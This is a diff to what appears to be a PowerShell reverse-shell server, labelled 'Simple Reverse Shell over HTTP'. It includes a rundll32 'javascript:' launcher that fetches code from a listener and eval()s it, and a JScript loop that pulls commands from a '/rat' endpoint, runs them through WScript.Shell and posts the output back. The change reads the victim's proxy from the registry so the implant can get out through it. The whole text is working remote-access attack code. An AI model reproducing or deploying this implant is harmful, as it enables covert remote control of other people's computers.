@@ -8,14 +8,14 @@
   
   Simple Reverse Shell over HTTP. Execute Commands on Client.  
   
-  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.SetProxy(2,"127.0.0.1:8888");h.Open("GET","http://127.0.0.1/connect",false);h.Send();B=h.ResponseText;eval(B)
+  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);h.Open("GET","http://127.0.0.1/connect",false);h.Send();B=h.ResponseText;eval(B)
+  
   
   Listening Server IP Address
   
 #>
 
 $Server = '127.0.0.1' #Listening IP. Change This.
-$Proxy = '127.0.0.1:8888' # Need a way to get this dynamically.  For Now You have to hard code it.
 
 function Receive-Request {
    param(      
@@ -58,15 +58,19 @@ while ($true) {
 					{
 						try
 						{
+							w = new ActiveXObject("WScript.Shell");
+							v = w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer");
+							q = v.split("=")[1].split(";")[0];
 							h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+							h.SetProxy(2,q);
 							h.Open("GET","http://'+$Server+'/rat",false);
 							h.Send();
 							c = h.ResponseText;
 							r = new ActiveXObject("WScript.Shell").Exec(c);
 							var so;
 							while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
-							p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-							p.SetProxy(2,"'+$Proxy+'");
+							p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");														
+							p.SetProxy(2,q);
 							p.Open("POST","http://'+$Server+'/rat",false);
 							p.Send(so);
 						}
